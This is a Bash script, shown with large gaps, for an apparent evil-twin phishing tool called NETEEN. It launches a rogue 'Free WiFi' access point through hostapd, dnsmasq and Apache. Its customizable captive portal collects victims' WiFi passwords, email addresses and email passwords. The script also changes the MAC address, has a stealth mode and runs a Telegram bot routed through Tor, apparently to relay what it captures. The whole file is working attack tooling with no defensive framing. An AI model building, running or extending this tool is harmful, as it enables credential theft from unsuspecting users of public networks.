#!/bin/bash
# NETEEN v4.9.0 - Все баги исправлены, стабильная агрессивная версия
...
# Стабильные пути (не удаляются при cleanup)
STABLE_DIR="/run/neteen"
mkdir -p "$STABLE_DIR" 2>/dev/null || die "Cannot create $STABLE_DIR"
chmod 700 "$STABLE_DIR"

# PID-файл основного процесса (для команды stop)
MAIN_PID_FILE="$STABLE_DIR/neteen.pid"
echo $$ > "$MAIN_PID_FILE"

# Файл состояния (сохраняем PID, интерфейс, цепочки, runtime dir)
STATE_FILE="$STABLE_DIR/state.json"
# Бот
BOT_CONFIG_FILE="$STABLE_DIR/bot.conf"
BOT_PID_FILE="$STABLE_DIR/bot.pid"
BOT_LOG="$STABLE_DIR/bot.log"
BOT_ERROR_LOG="$STABLE_DIR/bot_error.log"
# Конфиг портала и лог событий (PHP использует эти пути)
CONFIG_FILE="$STABLE_DIR/portal.json"
EVENT_LOG="$STABLE_DIR/events.jsonl"

# Переменные для runtime (будут пересоздаваться при каждом запуске портала)
RUNTIME_DIR=""
WIFI_IFACE=""
CLEANUP_DONE="false"
PLATFORM="KaliLinux"
...
init_languages() {
    ...
    LANG_STRINGS["en",75]="Select option"
    ...
    LANG_STRINGS["ru",75]="Выберите опцию"
...
select_language() {
    ...
    echo -e "${NC}"
    while true; do
        printf '%b' "${YELLOW}$(get_str 75) [0-2]: ${NC}"
        read -r lang_choice
        case $lang_choice in
...
select_interface() {
    ...
    echo -e "${NC}"
    while true; do
        printf '%b' "${YELLOW}$(get_str 12) [1-$(($count-1))]: ${NC}"
        read -r choice
...
select_portal_type() {
    ...
    echo -e "${NC}"
    while true; do
        printf '%b' "${YELLOW}$(get_str 30) [1-2]: ${NC}"
        read -r portal_type
...
select_theme() {
    ...
    echo -e "${NC}"
    while true; do
        printf '%b' "${YELLOW}$(get_str 30) [1-5]: ${NC}"
        read -r theme_choice
...
customize_portal() {
    ...
    select_theme
    echo ""
    printf '%b' "${YELLOW}$(get_str 39) [Network Login]: ${NC}"
    read -r portal_title
    portal_title="${portal_title:-Network Login}"
    printf '%b' "${YELLOW}$(get_str 40) [Enter credentials]: ${NC}"
    read -r welcome_msg
    welcome_msg="${welcome_msg:-Enter credentials}"
    printf '%b' "${YELLOW}$(get_str 41) [WiFi Password]: ${NC}"
    read -r wifi_label
    wifi_label="${wifi_label:-WiFi Password}"
    printf '%b' "${YELLOW}$(get_str 42) [Email]: ${NC}"
    read -r email_label
    email_label="${email_label:-Email}"
    printf '%b' "${YELLOW}$(get_str 43) [Password]: ${NC}"
    read -r email_pass_label
    email_pass_label="${email_pass_label:-Password}"
    printf '%b' "${YELLOW}$(get_str 44) [Connect]: ${NC}"
    read -r button_text
    button_text="${button_text:-Connect}"
    printf '%b' "${YELLOW}$(get_str 45) [Connected successfully]: ${NC}"
    read -r success_msg
...
setup_interface() {
    ...
    # Stop only our own processes using PID files, not global pkill
...
start_ap() {
    ...
    # Валидация SSID: печатные ASCII, длина 1-32
    if [[ ! "$ssid" =~ ^[[:print:]]+$ ]] || [[ ${#ssid} -lt 1 || ${#ssid} -gt 32 ]]; then
        echo -e "${RED}Invalid SSID (printable chars, 1-32 length)${NC}"
        return 1
    fi
...
EOF
    ...
    HOSTAPD_PID=$!
    echo "$HOSTAPD_PID" > "$RUNTIME_DIR/hostapd.pid"
    sleep 3
...
EOF
    ...
    dnsmasq -C "$RUNTIME_DIR/dnsmasq.conf" --no-daemon --pid-file="$RUNTIME_DIR/dnsmasq.pid" > "$RUNTIME_DIR/dnsmasq.log" 2>&1 &
    DNSMASQ_PID=$!
    echo "$DNSMASQ_PID" > "$RUNTIME_DIR/dnsmasq.pid"
    sleep 2
...
EOF
    # Проверка конфига
    if ! apache2 -t -f "$RUNTIME_DIR/apache.conf" 2>/dev/null; then
        echo -e "${RED}Apache config invalid${NC}"
        return 1
    fi
...
setup_routing() {
    ...
    # Создаём отдельные цепочки для FORWARD и INPUT
    OWN_IPTABLES_CHAIN="NETEEN_FWD_$(date +%s)_$$"
    OWN_INPUT_CHAIN="NETEEN_INP_$(date +%s)_$$"
    ...
    iptables -N "$OWN_INPUT_CHAIN" 2>/dev/null || true
    iptables -F "$OWN_INPUT_CHAIN" 2>/dev/null || true
    ...
    # INPUT rules
    iptables -A "$OWN_INPUT_CHAIN" -i "$WIFI_IFACE" -m tcp -p tcp --dport 80 -j ACCEPT
    iptables -A "$OWN_INPUT_CHAIN" -i "$WIFI_IFACE" -m udp -p udp --dport 67 -j ACCEPT
    iptables -A "$OWN_INPUT_CHAIN" -i "$WIFI_IFACE" -m udp -p udp --dport 53 -j ACCEPT
    iptables -A "$OWN_INPUT_CHAIN" -i "$WIFI_IFACE" -j DROP
    ...
    iptables -I INPUT 1 -j "$OWN_INPUT_CHAIN" 2>/dev/null || true
    ...
    cat > "$STATE_FILE" <<EOF
{
    ...
    "forward_chain": "$OWN_IPTABLES_CHAIN",
    "input_chain": "$OWN_INPUT_CHAIN",
    "orig_ip_forward": "$ORIG_IP_FORWARD",
    "orig_mac": "$ORIG_MAC",
    "orig_apache_state": "$ORIG_APACHE_STATE",
    "mac_changed": $([ "$MAC_CHANGED" = "true" ] && echo "true" || echo "false")
}
EOF
    return 0
}
...
cleanup_once() {
    ...
    # Загружаем state, если существует
    if [ -f "$STATE_FILE" ]; then
        RUNTIME_DIR_SAVED="$(jq -r '.runtime_dir' "$STATE_FILE" 2>/dev/null)"
        WIFI_IFACE_SAVED="$(jq -r '.wifi_iface' "$STATE_FILE" 2>/dev/null)"
        HOSTAPD_PID_SAVED="$(jq -r '.hostapd_pid' "$STATE_FILE" 2>/dev/null)"
        DNSMASQ_PID_SAVED="$(jq -r '.dnsmasq_pid' "$STATE_FILE" 2>/dev/null)"
        MONITOR_PID_SAVED="$(jq -r '.monitor_pid' "$STATE_FILE" 2>/dev/null)"
        FWD_CHAIN="$(jq -r '.forward_chain' "$STATE_FILE" 2>/dev/null)"
        INP_CHAIN="$(jq -r '.input_chain' "$STATE_FILE" 2>/dev/null)"
        ORIG_IP_FORWARD_SAVED="$(jq -r '.orig_ip_forward' "$STATE_FILE" 2>/dev/null)"
        ORIG_MAC_SAVED="$(jq -r '.orig_mac' "$STATE_FILE" 2>/dev/null)"
        ORIG_APACHE_STATE_SAVED="$(jq -r '.orig_apache_state' "$STATE_FILE" 2>/dev/null)"
        MAC_CHANGED_SAVED="$(jq -r '.mac_changed' "$STATE_FILE" 2>/dev/null)"
    else
        RUNTIME_DIR_SAVED="$RUNTIME_DIR"
        WIFI_IFACE_SAVED="$WIFI_IFACE"
        HOSTAPD_PID_SAVED="$HOSTAPD_PID"
        DNSMASQ_PID_SAVED="$DNSMASQ_PID"
        MONITOR_PID_SAVED="$MONITOR_PID"
        FWD_CHAIN="$OWN_IPTABLES_CHAIN"
        INP_CHAIN="$OWN_INPUT_CHAIN"
        ORIG_IP_FORWARD_SAVED="$ORIG_IP_FORWARD"
        ORIG_MAC_SAVED="$ORIG_MAC"
        ORIG_APACHE_STATE_SAVED="$ORIG_APACHE_STATE"
        MAC_CHANGED_SAVED="$MAC_CHANGED"
    fi

    # Останавливаем процессы по PID
    if [ -n "$HOSTAPD_PID_SAVED" ] && kill -0 "$HOSTAPD_PID_SAVED" 2>/dev/null; then
        kill -TERM "$HOSTAPD_PID_SAVED" 2>/dev/null || true
        wait "$HOSTAPD_PID_SAVED" 2>/dev/null || true
    fi
    if [ -n "$DNSMASQ_PID_SAVED" ] && kill -0 "$DNSMASQ_PID_SAVED" 2>/dev/null; then
        kill -TERM "$DNSMASQ_PID_SAVED" 2>/dev/null || true
        wait "$DNSMASQ_PID_SAVED" 2>/dev/null || true
    fi
    if [ -n "$MONITOR_PID_SAVED" ] && kill -0 "$MONITOR_PID_SAVED" 2>/dev/null; then
        kill -TERM "$MONITOR_PID_SAVED" 2>/dev/null || true
        wait "$MONITOR_PID_SAVED" 2>/dev/null || true
    fi

    # Останавливаем Apache
    if [ -f "$RUNTIME_DIR_SAVED/apache.conf" ]; then
        apache2 -f "$RUNTIME_DIR_SAVED/apache.conf" -d "$RUNTIME_DIR_SAVED" -k stop 2>/dev/null || true
    fi

    # Удаляем цепочки iptables
    if [ -n "$FWD_CHAIN" ] && iptables -L "$FWD_CHAIN" >/dev/null 2>&1; then
        iptables -D FORWARD -j "$FWD_CHAIN" 2>/dev/null || true
        iptables -t nat -D POSTROUTING -j "$FWD_CHAIN" 2>/dev/null || true
        iptables -F "$FWD_CHAIN" 2>/dev/null || true
        iptables -X "$FWD_CHAIN" 2>/dev/null || true
        iptables -t nat -F "$FWD_CHAIN" 2>/dev/null || true
        iptables -t nat -X "$FWD_CHAIN" 2>/dev/null || true
    fi
    if [ -n "$INP_CHAIN" ] && iptables -L "$INP_CHAIN" >/dev/null 2>&1; then
        iptables -D INPUT -j "$INP_CHAIN" 2>/dev/null || true
        iptables -F "$INP_CHAIN" 2>/dev/null || true
        iptables -X "$INP_CHAIN" 2>/dev/null || true
    fi

    # Восстанавливаем ip_forward
    if [ -n "$ORIG_IP_FORWARD_SAVED" ]; then
        sysctl -w net.ipv4.ip_forward="$ORIG_IP_FORWARD_SAVED" >/dev/null 2>&1 || true
    fi
    # Восстанавливаем MAC
    if [ "$MAC_CHANGED_SAVED" = "true" ] && [ -n "$ORIG_MAC_SAVED" ] && [ -n "$WIFI_IFACE_SAVED" ]; then
        ip link set "$WIFI_IFACE_SAVED" down 2>/dev/null || true
        ip link set dev "$WIFI_IFACE_SAVED" address "$ORIG_MAC_SAVED" 2>/dev/null || true
        ip link set "$WIFI_IFACE_SAVED" up 2>/dev/null || true
    fi
    # Восстанавливаем managed
    if command -v nmcli >/dev/null && [ -n "$WIFI_IFACE_SAVED" ]; then
        nmcli device set "$WIFI_IFACE_SAVED" managed yes 2>/dev/null || true
    fi
    # Восстанавливаем Apache
    if [ "$ORIG_APACHE_STATE_SAVED" = "active" ]; then
        if command -v systemctl >/dev/null; then
            systemctl start apache2 2>/dev/null || true
        fi
    fi

    # Удаляем runtime директорию
    if [ -n "$RUNTIME_DIR_SAVED" ] && [ -d "$RUNTIME_DIR_SAVED" ]; then
        rm -rf "$RUNTIME_DIR_SAVED" 2>/dev/null || true
    fi
    # Удаляем state-файл
...
toggle_anonymity() {
    if [ -f "/etc/neteen_anon_mode" ]; then
        ANON_MODE="$(sed -n 's/^ANON_MODE="\?\([^"]*\)"\?$/\1/p' /etc/neteen_anon_mode)"
    else
        ANON_MODE="false"
    fi
...
#!/usr/bin/env python3
import os, sys, time, json, subprocess, requests, threading, socket
from threading import Thread
try:
    import socks
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket
    print("Using Tor SOCKS5 proxy.")
except ImportError:
    print("PySocks not installed, using direct connection.")

CONFIG_FILE = "/run/neteen/bot.conf"
...
PYEOF
    ...
    nohup python3 "$BOT_PY_SCRIPT" "$SCRIPT_PATH" >> "$BOT_LOG" 2>>"$BOT_ERROR_LOG" &
    local pid=$!
    ...
    if kill -0 "$pid" 2>/dev/null; then
        ...
        echo -e "${RED}Bot failed to start. Check $BOT_ERROR_LOG${NC}"
        rm -f "$BOT_PID_FILE"
        return 1
    fi
    echo -e "${YELLOW}$(get_str 24)${NC}"
...
telegram_menu() {
    while true; do
        ...
        echo "╚════════════════════════════════════════════╝"
        echo ""
        printf '%b' "${YELLOW}$(get_str 75) [0-4]: ${NC}"
        read -r opt
        case "$opt" in
            1) configure_bot ;;
            2) start_bot ;;
...
stealth_portal() {
    ...
    printf '%b' "${YELLOW}$(get_str 102)${NC}"
    read -r anon_choice
    ...
    printf '%b' "${YELLOW}$(get_str 25) ${NC}"
    read -r AP_NAME
    [ -z "$AP_NAME" ] && AP_NAME="Free WiFi"
    if [[ ! "$AP_NAME" =~ ^[[:print:]]+$ ]] || [[ ${#AP_NAME} -gt 32 ]]; then
        echo -e "${RED}Invalid SSID (printable chars, max 32)${NC}"
        echo -e "${YELLOW}$(get_str 24)${NC}"
        read -r
        return 1
    fi

    printf '%b' "${YELLOW}$(get_str 84)${NC}"
    read -r SAVE_TO_FILE
    ...
    # Обновляем state с monitor PID
    if [ -f "$STATE_FILE" ]; then
        jq --argjson mpid "$MONITOR_PID" '.monitor_pid = $mpid' "$STATE_FILE" > "$STATE_FILE.tmp" && mv "$STATE_FILE.tmp" "$STATE_FILE"
    fi

    wait "$HOSTAPD_PID" 2>/dev/null || true
    cleanup_once
    echo -e "${YELLOW}Portal stopped. Press Enter to return to menu.${NC}"
    read -r
}

auto_portal() {
    require_root
    # Аналогично stealth_portal, но без меню и с автоматическими параметрами
    RUNTIME_DIR="$(mktemp -d /run/neteen/run.XXXXXX)" || die "Cannot create runtime dir"
    chmod 700 "$RUNTIME_DIR"
    CLEANUP_DONE="false"
    HOSTAPD_PID=""
...
handle_args() {
    ...
    case "$cmd" in
        ...
        --stop-portal)
            require_root
            # Читаем PID основного процесса
            if [ -f "$MAIN_PID_FILE" ]; then
                main_pid="$(cat "$MAIN_PID_FILE" 2>/dev/null)"
                if [ -n "$main_pid" ] && kill -0 "$main_pid" 2>/dev/null; then
                    kill -TERM "$main_pid" 2>/dev/null || true
                    sleep 2
                    # Дополнительно вызываем cleanup, если процесс уже завершился
                    exit 0
                else
                    die "Main process not running"
                fi
            else
                die "Main PID not found"
            fi
            ;;
        start)
            require_root
        ...
        stop)
            ...
            ;;
        status)
            if [ -f "$STATE_FILE" ] && [ -f "$MAIN_PID_FILE" ]; then
                main_pid="$(cat "$MAIN_PID_FILE" 2>/dev/null)"
                if [ -n "$main_pid" ] && kill -0 "$main_pid" 2>/dev/null && [ -f "$STATE_FILE" ]; then
                    echo "Portal is running (PID $main_pid)."
                else
...
if [ $# -gt 0 ]; then
    # Для CLI команд platform detection не нужно
    handle_args "$1"
    exit 0
fi
...
while true; do
    show_header
    show_main_menu
    printf '%b' "${YELLOW}$(get_str 75) [0-5]: ${NC}"
    read -r choice
    case "$choice" in
        1)
            require_root
